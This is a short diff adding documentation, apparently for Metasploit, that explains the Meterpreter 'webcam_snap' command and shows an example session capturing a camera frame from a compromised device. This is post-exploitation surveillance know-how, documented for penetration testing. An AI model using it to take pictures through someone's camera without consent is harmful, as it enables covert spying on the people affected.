@@ -1,0 +1,8 @@
+The webcam_snap command takes a picture from the device. You will have to use the webcam_list command to figure out which camera to use. Example:
+
+meterpreter > webcam_snap -i 2
+
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /Users/user/rapid7/msf/uFWJXeQt.jpeg
